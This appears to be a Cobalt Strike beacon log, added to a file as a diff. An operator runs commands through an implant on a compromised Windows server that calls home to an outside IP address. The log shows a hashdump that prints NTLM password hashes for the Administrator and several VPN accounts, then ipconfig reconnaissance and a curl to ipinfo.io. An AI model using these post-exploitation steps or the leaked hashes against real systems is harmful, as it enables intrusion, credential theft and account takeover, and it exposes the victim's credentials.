@@ -1,0 +1,72 @@
+12/10 17:27:17 UTC [metadata] 8.218.244.77 <- 192.168.35.10; computer: iZ9lfg3514uqhhZ; user: Administrator *; process: NewArtifact.exe; pid: 1200; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/10 17:27:29 UTC [input] <jhc> desktop
+12/10 17:27:31 UTC [checkin] host called home, sent: 16 bytes
+12/10 17:27:34 UTC [error] Cancel Input Stop Running VNC
+12/10 17:27:53 UTC [input] <jhc> hashdump
+12/10 17:27:53 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+12/10 17:27:54 UTC [checkin] host called home, sent: 82541 bytes
+12/10 17:27:58 UTC [output]
+received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:39ecd2f0c95a6d3251c5db186acb3122:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jaguar:1009:aad3b435b51404eeaad3b435b51404ee:980a0e8c01a002752cf8387775dccabd:::
+vpn:1001:aad3b435b51404eeaad3b435b51404ee:43e80f89fd78a5d1c131b55a1becfd3b:::
+vpn001:1008:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+vpn1:1002:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+vpn111:1007:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+vpn2:1003:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+vpn7:1004:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+vpn9:1005:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+vpn99:1006:aad3b435b51404eeaad3b435b51404ee:82aedfbe9a6849028b292a74613a921b:::
+
+
+12/10 17:28:12 UTC [input] <jhc> shell ipconfig
+12/10 17:28:12 UTC [task] <T1059> Tasked beacon to run: ipconfig
+12/10 17:28:13 UTC [checkin] host called home, sent: 39 bytes
+12/10 17:28:14 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+PPP 适配器 RAS (Dial In) Interface:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   IPv4 地址 . . . . . . . . . . . . : 192.168.35.10
+   子网掩码  . . . . . . . . . . . . : 255.255.255.255
+   默认网关. . . . . . . . . . . . . : 
+
+以太网适配器 以太网:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::88db:fb9b:274c:7521%12
+   IPv4 地址 . . . . . . . . . . . . : 172.17.246.63
+   子网掩码  . . . . . . . . . . . . : 255.255.0.0
+   默认网关. . . . . . . . . . . . . : 172.17.255.253
+
+隧道适配器 isatap.{C8A66A51-EC51-494B-ADF0-C3197D63EEEB}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 isatap.{6E06F030-7526-11D2-BAF4-00600815A4BD}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
+12/10 17:28:28 UTC [input] <jhc> shell curl ipinfo.io
+12/10 17:28:28 UTC [task] <T1059> Tasked beacon to run: curl ipinfo.io
+12/10 17:28:29 UTC [checkin] host called home, sent: 45 bytes
+12/10 17:28:30 UTC [output]
+received output:
+'curl' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+12/10 17:52:32 UTC [input] <jhc> exit
+12/10 17:52:32 UTC [task] <> Tasked beacon to exit
+12/10 17:52:33 UTC [checkin] host called home, sent: 8 bytes
+12/10 17:52:34 UTC [output]
+beacon exit.
+
